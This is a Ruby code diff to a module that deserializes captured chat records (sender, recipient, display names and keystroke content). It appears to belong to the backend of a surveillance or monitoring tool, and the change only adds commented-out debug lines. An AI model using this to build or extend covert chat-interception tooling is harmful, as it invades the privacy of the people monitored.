@@ -69,16 +69,21 @@ module ChatnewEvidence
 
       from = stream.read_utf16le_string
       info[:data][:from] = from.utf16le_to_utf8
+      #trace :debug, "CHAT from: #{info[:data][:from]}"
       from_display = stream.read_utf16le_string
       info[:data][:from_display] = from_display.utf16le_to_utf8
+      #trace :debug, "CHAT from_display: #{info[:data][:from_display]}"
 
       rcpt = stream.read_utf16le_string
       info[:data][:rcpt] = rcpt.utf16le_to_utf8
+      #trace :debug, "CHAT rcpt: #{info[:data][:rcpt]}"
       rcpt_display = stream.read_utf16le_string
       info[:data][:rcpt_display] = rcpt_display.utf16le_to_utf8
+      #trace :debug, "CHAT rcpt_display: #{info[:data][:rcpt_display]}"
 
       keystrokes = stream.read_utf16le_string
       info[:data][:content] = keystrokes.utf16le_to_utf8 unless keystrokes.nil?
+      #trace :debug, "CHAT content: #{info[:data][:content]}"
 
       delim = stream.read(4).unpack("L").first
       raise EvidenceDeserializeError.new("Malformed CHATNEW (missing delimiter)") unless delim == ELEM_DELIMITER
